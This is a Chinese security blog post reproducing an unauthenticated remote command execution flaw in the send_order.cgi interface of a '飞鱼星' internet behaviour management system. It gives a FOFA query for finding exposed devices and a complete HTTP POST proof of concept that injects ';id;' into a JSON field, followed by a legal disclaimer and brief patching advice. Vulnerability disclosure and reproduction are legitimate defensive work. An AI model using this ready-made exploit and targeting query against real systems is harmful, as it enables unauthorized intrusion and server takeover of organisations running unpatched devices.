#  漏洞复现 || 某智能上网行为管理系统前台RCE   
韩文庚  我爱林   2024-03-27 18:18  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
该智能上网行为管理系统 send_order.cgi接口处存在远程命令执行漏洞，未经身份验证的攻击者可以利用此漏洞执行任意指令，且写入后门文件可获取服务器权限，造成严重威胁。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNGrxfJk49icY8ZdowlpDfaa7W9XKz08MaD2AybkBVibT2biajHrwQiba3VS2JAW9QgymLHgVbiaTic3haQ/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： title=="飞鱼星企业级智能上网行为管理系统"
```  
## 漏洞复现  
  
  
1.  
利用如下POC执行id得到回显  
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: {{Hostname}}
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68


{"opid":"6","name":";id;","type":"rest"}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNGrxfJk49icY8ZdowlpDfaaE4mRuqeQ7ToD3XoYvb2gdIWr8uoibZHtY4W9u4KGahIEGkj5jtCtZ3g/640?wx_fmt=png&from=appmsg "")  
## 修复建议  
  
  
1.  
升级至安全版本  
  
2.  
关闭互联网暴  
露面或接口设置访问权限  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
